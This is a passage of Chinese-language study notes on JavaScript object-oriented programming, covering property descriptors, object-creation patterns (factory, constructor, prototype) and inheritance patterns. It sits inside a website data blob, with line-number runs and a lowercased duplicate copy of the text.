35, "Doctor");\n\nfor (var prop in person) {\n    if (person.hasOwnProperty(prop)) {\n        console.log("prop1", prop);      // "name"、"age"、"job"，过滤掉了原型上的属性"sayName"\n    }\n    console.log("prop2", prop);      // "name"、"age"、"job"、"sayName"，不管它是实例中的还是原型中\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nECMAScript5新增的Object.keys()方法会返回 可枚举的实例属性（不会返回该对象的原型上的属性）；上面的例子里的for-in可以替换为：\n\nvar keys = Object.keys(person);\nkeys.forEach(function(prop) {\n    console.log(prop);          // "name"、"age"、"job"，keys是个数组\n});\n\n\n1\n2\n3\n4\n\n\n不止Object.keys()可替代for-in，Object.getOwnPropertyNames()也可以，只是它是返回所有 实例属性，不管是否可枚举。\n\n// 可用在某个原型对象上，那就返回该原型对象的“实例属性”，不会返回该原型对象的原型上的属性；一定要区分“实例属性”和“原型上的属性”\nvar keys = Object.getOwnPropertyNames(Person.prototype);\nkeys.forEach(function(prop) {\n    console.log(prop);          // "consctrutor"、"sayName"，"consctrutor"是不可枚举的\n});\n\n\n1\n2\n3\n4\n5\n\n\n# 2.3.3 更简单的原型语法\n\n使用字面量的方式优化在原型上添加属性，但是要注意，使用字面量形式相当于重写了prototype，那么其constructor会被覆盖，这里得重新赋值constructor；但又会引入一个新问题，重新赋值的constructor其[[Enumerable]]特性变为了true，也就可枚举的了，原生的constructor属性是不可枚举的。\n\nfunction Person() {}\nPerson.prototype = {\n    constructor: Person,    // 重新赋值，但是[[Enumerable]]特性变为了true\n    name: "S",\n    age: 35,\n    job: "Doctor",\n    sayName: function() {\n        console.log(this.name);\n    }\n};\nObject.defineProperty(Person.prototype, "constructor", {\n    enumerable: false,\n    value: Person\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 2.3.4 原型的动态性\n\n之前我们通过实例的[[Prototype]]（也就是Object.getPrototypeOf(person)）是修改不了原型里的值，现在可以通过Person.prototype.xxx来修改原型里的值，并且能立即从实例上反映出这个修改。\n\n修改没问题，但重写Person.prototype得注意一下：如果实例化在先，重写Person.prototype在后，实例对象的[[Prototype]]指向的原型对象是没有变的，它没有指向重写后的Person.prototype，还是指向着老原型对象。\n\nfunction Person() {}\n\nvar friend = new Person();  // 先实例化\n\nPerson.prototype = {        // 后重写Person.prototype\n    constructor: Person,\n    name: "S",\n    age: 35,\n    job: "Doctor",\n    sayName: function() {\n        console.log(this.name);\n    }\n};\nfriend.sayName(); // error，只是将新对象赋给了Person.prototype，并没有一并赋给对象的[[Prototype]]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n解决办法当然是将重写Person.prototype这步骤放在 实例化之前 了。\n\n# 2.3.5 原生对象的原型\n\n原生的引用类型 创建时也采用了 原型模式，可在原型上找到一些方法：Array.prototype.sort()、String.prototype.substring()。可以在原型上新添方法，不过不推荐新添或修改方法。\n\n# 2.3.6 原型对象的问题\n\n原型模式 省略了为构造函数传递初始化参数这一环节，而会在原型上直接赋予属性的值，所有的实例也是 共享 了原型上的属性，一旦原型上的值发生改变（一般不会变，除了引用类型属性），就会立即同步到所有实例上。\n\n这样的共享对于一些 固定值 的属性来说还是有帮助的，比如 方法复用 和 常量式的属性；而对一些 经常变化 的值来说，就非常不友好，因为无法重写原型上的属性的值，只能借助一些特殊的手段： - 原型里的基本类型属性：可以通过实例.属性名的方式给某个实例对象添加对应的同名属性，这样就可以 屏蔽 原型上的同名属性了； - 原型里的引用类型属性：也可以使用屏蔽的方式，也可以直接 调用引用类型属性的方法 或者 修改引用类型属性的属性，但会有个问题，效果会立即同步到其他实例上，因为原型上的属性都是被所有实例共享的。\n\nfunction Person() {}\nPerson.prototype = {\n    constructor: Person,\n    name: "S",\n    age: 35,\n    job: "Doctor",\n    friends: ["Shelby", "Court"],\n    sayName: function() {\n        console.log(this.name);\n    }\n};\nvar person1 = new Person();\nvar person2 = new Person();\n// 使用“实例.属性名”重新赋值的时候，其实是在实例上新增属性，这样就屏蔽了原型上的同名属性\nperson1.name = "L";\nconsole.log(person1.name);      // "L"，虽然是共享同一个name，但上一步在person1上新建了一个name属性\nconsole.log(person2.name);      // "S"，共享同一个name，还是原型上的name，person2里是没有name属性的\n// “实例.属性名”可以屏蔽原型上的同名属性，这里是调用了原型上的引用类型属性的方法，效果会立即同步到其他实例上\nperson1.friends.push("Van");\nconsole.log(person1.friends);   // ["Shelby", "Court", "Van"]，效果同步了；如果是person1.friends = xxx;就可以屏蔽了\nconsole.log(person2.friends);   // ["Shelby", "Court", "Van"]，效果同步了\nconsole.log(person1.friends === person2.friends); // true，共享同一个引用类型\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.4 组合使用构造函数模式和原型模式\n\n在原型与in操作符里讲“实例属性”和“原型上的属性”举过里例子，在构造函数里定义一些属性（独享），在原型里也定义一些属性（共享），这是组合使用 构造函数模式 和 原型模式 的一种混成模式。\n\nfunction Person(name, age, job) {\n    this.name = name;\n    this.age = age;\n    this.job = job;\n    this.friends = ["W", "Q"];\n}\nPerson.prototype = {\n    constructor: Person,\n    sayName: function() {\n        console.log(this.name);\n    }\n};\nvar person1 = new Person("L", 22, "Student");\nvar person2 = new Person("S", 35, "Doctor");\nperson1.friends.push("T");\nconsole.log(person1.friends);                       // ["W", "Q", "T"]\nconsole.log(person2.friends);                       // ["W", "Q"]\nconsole.log(person1.friends === person2.friends);   // false，独享的\nconsole.log(person1.sayName === person2.sayName);   // true，共享的\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 2.5 动态原型模式\n\n动态原型模式 是对“组合使用 构造函数模式 和 原型模式 ”的优化，通过检查某个应该存在的方法是否有效来决定是否需要将其 添加到原型中去。\n\nfunction Person(name, age, job) {\n    this.name = name;\n    this.age = age;\n    this.job = job;\n    if (typeof this.sayName != "function") {\n        Person.prototype.sayName = function() {\n            console.log(this.name);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n这种方式可谓非常完美，但要注意的是 添加到原型 并不是重写原型，因为在调用构造函数时相当于先实例一个对象，具体原因可以查看原型的动态性。\n\n\n# 2.6 寄生构造函数模式\n\n寄生构造函数模式 其实是一个 工厂模式，只是把定义函数和使用函数的方式改为了 构造函数模式 的方式。这个模式的作用，为一个类型添加额外的方法。能使用其他模式的情况下最好不要使用这个模式，因为在构造函数内部或者外部创建对象都一样，而在内部创建只是为了添加额外新方法，对这个对象使用instanceof检测出来的结果跟构造函数本身没有关系。\n\nfunction SpecialArray() {\n    var values = new Array();\n    values.push.apply(values, arguments);\n    values.toPipedString = function() { // 为Array额外添加的方法\n        return this.join("|");\n    }\n    return values;\n}\nvar colors = new SpecialArray("red", "blue", "green");\nconsole.log(colors.toPipedString());    // "red|blue|green"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 2.7 稳妥构造函数模式\n\n通过 稳妥构造函数模式 创建的对象是 稳妥对象，这种稳妥对象没有 公共属性 而且其方法也不引用 this的对象。适合在一些安全的环境中或者防止数据给其他应用程序改动，因为在构造函数里没有使用this，也没有将初始入参绑到对象上（只给你使用，但不能修改原始值），那么在外部也不能访问到构造函数中的原始数据。\n\nfunction Person(name, age, job) {\n    var o = new Object();\n    o.sayName = function() {            // 为Object额外添加的方法\n        console.log(name)               // 没有使用this\n    }\n    return o;\n}\nvar person = Person("L", 22, "Student");// 没有使用new\nperson.sayName();                       // "L"\nconsole.log(person.name);               // undefined，外部也不能访问到构造函数中的原始数据\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 三、继承\n\n一般有两种类型的继承：接口继承 和 实现继承。接口继承只继承 方法签名，而实现继承是继承了 实际的方法。ECMAScript里函数没有签名，只支持实现继承，且主要依靠 原型链 来实现的。\n\n\n# 3.1 原型链\n\nECMAScript中的继承，是利用原型让一个引用类型继承另一个引用类型的属性和方法。让引用类型A的 实例 作为引用类型B的 原型对象，那么引用类型B的 原型对象 上就有了 [[Prototype]]指针 并指向引用类型A的 原型对象，而引用类型A的原型对象里有个constructor属性就是指向 引用类型 A的。这样链式结构也就是所谓的 原型链，引用类型B可以使用引用类型A的属性和方法（B继承了A）。\n\nfunction A() {\n    this.property = true;\n}\nA.prototype.getValueA = function() {\n    return this.property;\n}\nfunction B() {\n    this.subproperty = false;\n}\nB.prototype = new A();                  // 引用类型A的实例作为引用类型B的原型对象，B继承了A\nB.prototype.getValueB = function() {    // B除了继承了A的属性和方法，还给自己新添加了方法\n    return this.subproperty;\n}\nvar instance = new B();\nconsole.log(instance.getValueA());      // true，B继承了A，所以可以访问A的方法\nconsole.log(instance.constructor === A);// true，B原型等于了A的实例，B原型的constructor不再是B了，会去A里查找\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n有个需要注意的地方，instance.constructor现在指向了引用类型A。这是因为引用类型B的原型指向了引用类型A的原型，而引用类型A的原型的constructor是指向引用类型A的。\n\n# 3.1.1 默认的原型\n\n所有引用类型都继承了Object，这个继承也是通过原型链实现的，那么所有引用类型的默认原型都是Object的实例，因此默认原型会指向Object的原型。这也是自定义类型都会继承toString()、valueOf()等默认方法的根本原因。\n\n# 3.1.2 确定原型和实例的关系\n\n一种是使用instanceof操作符：\n\nconsole.log(instance instanceof Object);    // true\nconsole.log(instance instanceof A);         // true\nconsole.log(instance instanceof B);         // true\n\n\n1\n2\n3\n\n\n另一种使用isPrototypeOf()方法：\n\nconsole.log(Object.prototype.isPrototypeOf(instance));    // true\nconsole.log(A.prototype.isPrototypeOf(instance));         // true\nconsole.log(B.prototype.isPrototypeOf(instance));         // true\n\n\n1\n2\n3\n\n\n# 3.1.3 谨慎地定义方法\n\n子类在原型上添加新方法或者重写父类的方法时，语句一定要在“继承语句”之后，下面这个例子就是“(2)(3)”必须得在“(1)”之后。\n\nfunction A() {\n    this.property = true;\n}\nA.prototype.getValueA = function() {\n    return this.property;\n}\nfunction B() {\n    this.subproperty = false;\n}\nB.prototype = new A();                  // (1)继承语句，B继承了A\nB.prototype.getValueB = function() {    // (2)B给自己新添加了方法\n    return this.subproperty;\n}\nB.prototype.getValueA = function() {    // (3)重写了A里存在的方法\n    return false;\n}\nvar instance = new B();\nconsole.log(instance.getValueA());      // false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n通过原型链实现继承时，不能在“继承语句”之后再使用字面量重写原型，这样会打乱原型链而构不成继承关系了，例：\n\nfunction A() {\n    this.property = true;\n}\nA.prototype.getValueA = function() {\n    return this.property;\n}\nfunction B() {\n    this.subproperty = false;\n}\nB.prototype = new A();           // B继承了A\nB.prototype = {                  // 使用字面量添加新方法，会导致上一行代码无效\n    getValueB: function() {\n        return this.subproperty;\n    },\n    someOtherMethod: function() {\n        return false;\n    },\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 3.1.4 原型链的问题\n\n在“创建对象”的原型模式里有说过原型对象的问题。\n\n在继承里，原型链模式也有同样的问题。因为让 父类的实例 当作了 子类的原型对象，那么子类的所有实例 共享 父类的那个实例里的 所有属性，不管是父类的“实例属性”还是“原型上的属性”。\n\n原型链模式还有一个问题：没有办法在不影响所有对象实例的情况下，给父类的构造函数中传递参数。\n\n正因为上述两个问题，在实践中 很少单独使用原型链模式。\n\n\n# 3.2 借用构造函数\n\n借用构造函数，在子类的构造函数里调用父类的构造函数。在子类的实例里会执行父类的构造函数，那么子类的实例可以 独享 父类的实例属性。\n\nfunction A() {\n    this.colors = ["red", "blue", "green"];\n}\nfunction B() {\n    A.call(this);               // 使用apply也可以，并且也可以传递参数，比如给colors传值\n}\nvar instance1 = new B();\ninstance1.colors.push("black");\nconsole.log(instance1.colors);  // ["red", "blue", "green", "black"]\nvar instance2 = new B();\nconsole.log(instance2.colors);  // ["red", "blue", "green"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n借用构造函数的方式可以解决原型链模式里“不能向父类的构造函数中传递参数”的问题，但跟“创建对象”里的“构造函数模式”有同样的问题，就是 函数无法复用，每次调用构造函数都会重复创建了一次函数。\n\n\n# 3.3 组合继承\n\n组合继承，就是将 原型链模式 和 借用构造函数模式 组合到一块，使用原型链实现对 原型属性和方法的继承，通过借用构造函数来实现对 实例属性的继承。\n\nfunction A(name) {\n    this.name = name;\n    this.colors = ["red", "blue", "green"];\n}\nA.prototype.sayName = function() {  // 方法写在原型上，达到复用方法的目的\n    console.log(this.name);\n}\nfunction B(name, age) {\n    A.call(this, name);             // 第二次调用构造函数，“借用构造函数模式”，来继承父类的实例属性\n    this.age = age;\n}\nB.prototype = new A();              // 第一次调用构造函数，“原型链模式”，继承父类的实例属性和原型上的属性\nB.prototype.constructor = B;\nB.prototype.sayAge = function() {   // 方法写在原型上，达到复用方法的目的\n    console.log(this.age);\n}\n\nvar instance1 = new B("L", 22);\ninstance1.colors.push("black");\nconsole.log(instance1.colors);      // ["red", "blue", "green", "black"]\ninstance1.sayName();                // "L"\ninstance1.sayAge();                 // 22\nvar instance2 = new B("S", 35);\nconsole.log(instance2.colors);      // ["red", "blue", "green"]\ninstance2.sayName();                // "S"\ninstance2.sayAge();                 // 35\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n这样避免了 原型链模式 和 借用构造函数模式 的缺陷，又融合了它们的优点，是比较常用的一种继承模式。而且instanceof和isPrototypeOf()也能用于识别基于组合继承创建的对象。\n其实 组合继承 也有缺点：无论什么情况下都会 调用两次父类的构造函数；在第一次调用父类的构造函数，子类的原型上得到了父类的 实例属性和原型上的属性，在第二次调用父类的构造函数，子类的实例会得到父类的 实例属性，这样实例属性既存在于实例上也存在于原型上，会显得很冗余。\n\n\n# 3.4 原型式继承\n\n原型链模式 其实也是用了构造函数的写法。如果不使用构造函数而使用普通函数，并且在普通函数内部定义一个 临时引用类型 的构造函数，再让普通函数的 入参对象 作为这个临时引用类型的 原型，最后返回这个临时引用类型的 实例，那么这个实例是继承了函数入参对象的属性和方法，这种继承方式叫做 原型式继承。\n\nfunction object(o) {\n    function F() {}     // 定义临时引用类型F的构造函数\n    F.prototype = o;    // 普通函数的入参对象o作为这个临时引用类型F的原型\n    return new F();     // 最后临时引用类型F的实例\n}\n\nvar person = {\n    name: "Nicholas",\n    friends: ["Shelby", "Court", "Van"]\n};\nvar anotherPerson = object(person);\nanotherPerson.name = "Greg";            // 使用“实例.属性名”重新赋值的时候，其实是在实例上新增属性，这样就屏蔽了原型上的同名属性\nanotherPerson.friends.push("Rob");      // 这不是屏蔽（屏蔽是用“=”），而是调用了原型上的引用类型属性的方法，效果会立即同步到其他实例上\nvar yetAnotherPerson = object(person);\nyetAnotherPerson.name = "Linda";        // 使用“实例.属性名”重新赋值的时候，其实是在实例上新增属性，这样就屏蔽了原型上的同名属性\nyetAnotherPerson.friends.push("Barbie");// 这不是屏蔽（屏蔽是用“=”），而是调用了原型上的引用类型属性的方法，效果会立即同步到其他实例上\n\nconsole.log(person.friends);            //  ["Shelby", "Court", "Van", "Rob", "Barbie"]，之前的操作效果同步了（因为共享）\nconsole.log(person.name);               // "Nicholas"\nconsole.log(anotherPerson.name);        // "Greg"，虽说也是共享，但之前使用“实例.属性名”重新赋值的手段屏蔽了原型上的同名属性\nconsole.log(yetAnotherPerson.name);     // "Linda"，虽说也是共享，但之前使用“实例.属性名”重新赋值的手段屏蔽了原型上的同名属性\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nECMAScript5通过新增Object.create()方法规范化了原型式继承，该方法接收两个参数：作为新对象原型的对象、位新对象定义额外属性的对象。\n\nvar person = {\n    name: "Nicholas",\n    friends: ["Shelby", "Court", "Van"]\n};\nvar anotherPerson = Object.create(person); // 生成了一个对象，这个对象的原型指向了person\nanotherPerson.name = "Greg";            // 使用“实例.属性名”重新赋值的时候，其实是在实例上新增属性，这样就屏蔽了原型上的同名属性\nanotherPerson.friends.push("Rob");      // 这不是屏蔽（屏蔽是用“=”），而是调用了原型上的引用类型属性的方法，效果会立即同步到其他实例上\nvar yetAnotherPerson = Object.create(person, {\n    name: {\n        value: "Linda"                  // 屏蔽了原型上的同名属性\n    }\n});\nyetAnotherPerson.friends.push("Barbie");\n\nconsole.log(person.friends);            //  ["Shelby", "Court", "Van", "Rob", "Barbie"]，之前的操作效果同步了（因为共享）\nconsole.log(person.name);               // "Nicholas"\nconsole.log(anotherPerson.name);        // "Greg"，虽说也是共享，但之前使用“实例.属性名”重新赋值的手段屏蔽了原型上的同名属性\nconsole.log(yetAnotherPerson.name);     // "Linda"，虽说也是共享，但之前了原型上的同名属性\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n没必要兴师动众地创建构造函数，而只想让一个对象 浅复制 另一个对象，可以使用 原型式继承。但它与 原型链模式 的缺点一样，原型上的属性会被一直共享，特别是引用类型的属性。\n\n浅复制，之前在2.变量、作用域和内存问题#复制变量值里提到过，复制对象的属性值，如果属性是引用类型，只会复制地址值，堆里的对象还是同一个（对象不会被复制）。\n\n\n# 3.5 寄生式继承\n\n寄生式继承 和 寄生构造函数模式 有些类似。使用了 工厂模式 并在里面调用了一个生成新对象的函数（例如上节的object()），让一个对象复制另一个对象，然后给这个新对象添加自己的实例方法，最后返回这个新对象。\n\nfunction createAnother(original) {\n    var clone = object(original);   // 调用一个创建新对象的函数，不一定就是上节的object()，也可以是Object.create()\n    clone.sayHi = function() {      // 额外给新对象添加方法\n        console.log("Hi");\n    }\n    return clone;                   // 返回这个新对象\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n寄生式继承 里额外添加方法是做不到函数 复用 的。\n\n\n# 3.6 寄生组合式继承\n\n在组合继承那节说过它的缺点，继承到属性比较 冗余（原型和实例有同样的属性）。然后 寄生组合式继承 可以解决这个问题。\n寄生组合式继承：不必为了指定子类的原型而调用父类的 构造函数，直接让子类的原型使用 寄生式继承（原型式继承也可以） 来继承父类的 原型，其他的同 组合继承。\n\nfunction A(name) {\n    this.name = name;\n    this.colors = ["red", "blue", "green"];\n}\nA.prototype.sayName = function() {          // 方法写在原型上，达到复用方法的目的\n    console.log(this.name);\n}\nfunction B(name, age) {\n    A.call(this, name);                     // “借用构造函数”，来继承实例属性\n    this.age = age;\n}\nB.prototype = Object.create(A.prototype);   // “寄生式继承”或“原型式继承”，来继承原型上的属性\nB.prototype.constructor = B;\nB.prototype.sayAge = function() {           // 方法写在原型上，达到复用方法的目的\n    console.log(this.age);\n}\n\nvar instance1 = new B("L", 22);\ninstance1.colors.push("black");\nconsole.log(instance1.colors);              // ["red", "blue", "green", "black"]\ninstance1.sayName();                        // "L"\ninstance1.sayAge();                         // 22\nvar instance2 = new B("S", 35);\nconsole.log(instance2.colors);              // ["red", "blue", "green"]\ninstance2.sayName();                        // "S"\ninstance2.sayAge();                         // 35\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n',normalizedContent:'# 面向对象程序设计\n\n\n# 一、理解对象\n\n面向对象的语言 有一个标志，那就是它们都有 类 的概念，通过类可以创建任意多个具有 相同属性和方法 的对象。而 ecmascript没有类的概念，与其他基于类的语言创建的对象不同的是，ecmascript定义的对象是 无序属性 的集合，其属性可以是基本值、对象或函数。通俗点说就是ecmascript里的对象，其属性是一群没有特点顺序的值，属性或方法都有自己的名字，这些名字有自己映射的值，可以把这样的对象结构想象成 散列表（键值对）。\n\n创建自定义对象早期用 构造函数 并 逐个将属性赋值，后来常用 对象字面量 来创建对象，例：\n\n// 构造函数的方式\nvar person = new object();\nperson.name = "nicholas";\nperson.age = 29;\nperson.job = "software engineer";\nperson.sayname = function() {\n    console.log(this.name);\n}\n\n// 对象字面量的方式\nvar person = {\n    name: "nicholas",\n    age: 29,\n    job: "software engineer",\n    sayname: function() { console.log(this.name); }\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 1.1 属性类型\n\necamscript属性有两种：数据属性 和 访问器属性。\n\necamscript5定义了内部才使用（实现js引擎）的 特性，是用来描述属性的各种特征的，特性是用两对方括号括起来表示的，例：[[enumerable]]。\n\n# 1.1.1 数据属性\n\n数据属性有4个描述其行为的特性：\n\n * [[configurable]]：可配置的，表示能否通过删除属性的行为从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性，该特性默认为true；\n * [[enumerable]]：可枚举的，表示能否通过for-in循环返回属性，该特性默认为true；\n * [[writable]]：可重写的，表示能否修改属性的值，该特性默认为true；\n * [[value]]：包含这个属性的数据值，属性值的读写都在这个位置，该特性默认为undefined。\n\n想修改属性默认的特性，可以使用ecmascript5的object.defineproperty()方法，接收三个参数：属性所在的对象、属性的名字 和 一个描述符对象。其中描述符对象的属性必须是configurable、enumerable、writable和value中的一个或多个。\n\nvar person = {};\nobject.defineproperty(person, "name", {\n    configurable: false,    // 不可配置，那么不能通过删除语句来删除对象的这个属性，并且其他特性也不能修改了，configurable也改不回true了\n    value: "nicholas"\n});\nconsole.log(person.name);   // "nicholas"\ndelete person.name;         // 因为[[configurable]]特性为false，这里删除无效\nconsole.log(person.name);   // "nicholas"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n之前是使用object.defineproperty()修改属性，如果使用它 创建新属性，不指定[[configurable]]、[[enumerable]]、[[writable]]特性时，这三个会被默认设置为 false。\n\n大多数情况下不会去使用object.defineproperty()操作属性的那些特性（没有使用的必要），只是为了加深对javascript对象的理解。\n\n# 1.1.2 访问器属性\n\n访问器属性不包含数据值，但包含一对getter和setter函数（非必需的），访问器属性有4个特性：\n\n * [[configurable]]：可配置的，表示能否通过删除属性的行为从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性，该特性默认为true；\n * [[enumerable]]：可枚举的，表示能否通过for-in循环返回属性，该特性默认为true；\n * [[get]]：在读取属性时调用的函数，该特性默认为undefined；\n * [[set]]：在写入属性时调用的函数，该特性默认为undefined。\n\n访问器属性不能直接定义，必须使用object.defineproperty()来定义。\n\nvar book = {\n    _year: 2004,    // 下划线一般表示为只能通过对象方法访问的属性（内部属性）\n    edition: 1\n};\nobject.defineproperty(book, "year", {\n    get: function() {\n        return this._year;\n    },\n    set: function(newvalue) {   // 使用访问器属性的常见方式，即设置一个属性的值会导致其他属性发生变化\n        if (newvalue > 2004) {\n            this._year = newvalue;\n            this.edition += newvalue - 2004;\n        }\n    }\n});\nbook.year = 2005;\nconsole.log(book.edition); // 2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n只指定getter而不指定setter，意味着属性不能写，尝试写入属性会被忽略，严格模式下会抛错；\n只指定setter而不指定getter，意味着属性不能读，尝试读出属性会返回undefined，严格模式下会抛错。\n\n\n# 1.2 定义多个属性\n\nobject.defineproperties()方法可以通过描述符一次定义多个属性。第一个参数是要添加和修改其属性的对象（目标对象），第二个参数是一个对象其属性与目标对象的属性一一对应。\n\nvar book = {};\nobject.defineproperties(book, {\n    _year: {                // 数据属性\n        writable: true,\n        value: 2004\n    },\n    edition: {              // 数据属性\n        writable: true,\n        value: 1\n    },\n    year: {                 // 访问器属性（三个属性同时创建）\n        get: function() {\n            return this._year;\n        },\n        set: function() {\n            if (newvalue > 2004) {\n                this._year = newvalue;\n                this.edition += newvalue - 2004;\n            }\n        }\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 1.3 读取属性的特性\n\nobject.getownpropertydescriptor()可以取得给定属性的 描述符。接收两个参数：属性所在的对象、要读取其描述符的属性名称。返回值是一个对象，这个对象有configurable、enumerable、writable和value（如果是访问器属性，那返回值属性是configurable、enumerable、get和set）。\n\nvar book = {};\nobject.defineproperties(book, {\n    _year: {\n        value: 2004\n    },\n    edition: {\n        value: 1\n    },\n    year: {\n        get: function() {\n            return this._year;\n        },\n        set: function() {\n            if (newvalue > 2004) {\n                this._year = newvalue;\n                this.edition += newvalue - 2004;\n            }\n        }\n    }\n});\nvar descriptor = object.getownpropertydescriptor(book, "_year");\nconsole.log(descriptor.value);          // 2004\nconsole.log(descriptor.configurable);   // false\nconsole.log(typeof descriptor.get);     // undefined\n\nvar descriptor = object.getownpropertydescriptor(book, "year");\nconsole.log(descriptor.value);          // undefined\nconsole.log(descriptor.enumerable);     // false\nconsole.log(typeof descriptor.get);     // "function"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 二、创建对象\n\n使用 构造函数式 或者 对象字面量 来创建对象，有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为解决这个问题，推出了 工厂模式 的一种变体。\n\n\n# 2.1 工厂模式\n\n工厂模式 抽象了创建具体对象的过程。用函数来封装以特定接口创建对象的细节。\n\nfunction createperson(name, age, job) {\n    var o = new object();\n    o.name = name;\n    o.age = age;\n    o.job = job;\n    o.sayname = function() {\n        console.log(this.name);\n    }\n    return o;\n}\nvar person1 = createperson("l", 22, "student");\nvar person2 = createperson("s", 35, "doctor");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n函数createperson可以根据入参来创建不同的对象（属性名相同，但属性值不同），下次创建新对象时不再需要写创建对象的代码了重新调用即可。\n\n工厂模式虽然解决了创建多个相似对象的问题（代码重复的问题，还隐藏了细节），但却没有解决 对象识别 的问题（即怎么知道一个对象的类型）。\n\n\n# 2.2 构造函数模式\n\n构造函数模式 改进了工厂模式，在函数里 不显示 创建对象了，直接将属性和方法赋给了函数的 this对象，去掉了 return 语句。然后参考其他语言的规范，将函数的首字母大写了，实例化时还使用了new关键字，这样也就区分了ecmascript中的其他函数，这种函数就叫做 构造函数。\n\nfunction person(name, age, job) {   // (1)隐式创建了一个新对象，\n    this.name = name;               // (2)函数调用处的执行环境赋给了新对象，\n    this.age = age;                 // (3)为这个新对象添加属性，\n    this.job = job;                 // (4)最后隐式返回了这个新对象\n    this.sayname = function() {\n        console.log(this.name);\n    }\n}\nvar person1 = new person("l", 22, "student");\nvar person2 = new person("s", 35, "doctor");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nperson1和person2都拥有同一个constructor（构造函数）属性，该属性指向person（解决了工厂模式不能识别对象类型的问题），检查对象可以使用这个属性，但最好还是使用instanceof。\n\nconsole.log(person1.constructor == person);     // true\nconsole.log(person2.constructor == person);     // true\n\nconsole.log(person1 instanceof object);         // true\nconsole.log(person2 instanceof object);         // true\nconsole.log(person1 instanceof person);         // true\nconsole.log(person2 instanceof person);         // true\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 2.2.1 将构造函数当作函数\n\n// 当作构造函使用\nvar person = new person("l", 22, "student");\nperson.sayname(); // "l"\n\n// 作为普通函数调用\nperson("s", 35, "doctor");\nwindow.sayname(); // "s"\n\n// 在另一个对象的作用域中调用\nvar o = new object();\nperson.call(o, "l", 22, "student");\no.sayname(); // "l"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n将构造函数当作函数一般就两种使用方式，一种是不使用new而直接调用，另一种就是不使用new但配合call()使用。\n\n * 不使用new而直接调用：属性和方法都被添加给window对象了，因为它是在全局作用域中调用的，this对象指向window对象（global对象）；\n * 不使用new但配合call()使用：配合apply()也可以的；外部新建了一个对象，让这个对象作为call的第一个参数，也就是说person的执行环境就是这个新对象了，最后person里的新属性和方法都会添加到这个新对象上。\n\n# 2.2.2 构造函数的问题\n\n构造函数的主要问题：每个方法都要在每个实例上 重新创建 一遍，也就是说每个实例拥有同名函数但值不同。\n\nconsole.log(person1.sayname == person2.sayname);    // false\n\n\n1\n\n\n要解决这个问题，可以在构造函数的 外部 创建一个函数，让构造函数里的那个属性指向这个新函数，那么所有实例对象的那个属性也都指向了这个新函数。\n\nfunction person(name, age, job) {\n    this.name = name;\n    this.age = age;\n    this.job = job;\n    this.sayname = sayname;\n}\nfunction sayname() {\n    console.log(this.name);\n}\nvar person1 = new person("l", 22, "student");\nvar person2 = new person("s", 35, "doctor");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n这样确实解决了 重复创建函数 的问题，但是有了新问题：外部定义的新函数应该只能被对应的构造函数所使用，但实际上其他构造函数一样能使用，这就比较混乱了，然后构造函数里要是需要多个函数，那么在外部还要创建多个新函数（没有封装性）。\n\n\n# 2.3 原型模式\n\n函数都有一个prototype属性，它指向一个对象（原型对象），这个对象上存储了 所有实例共享的属性和方法。意思就是，通过某个构造函数实例出的一些对象，它们都共享了 原型对象 上的属性和方法。\n\n使用原型对象的好处是， 不必在构造函数里 定义对象实例的信息，可以直接将这些信息添加到原型对象中。\n\nfunction person() {}\nperson.prototype.name = "s";\nperson.prototype.age = 35;\nperson.prototype.job = "doctor";\nperson.prototype.sayname = function() {\n    console.log(this.name);\n}\nvar person1 = new 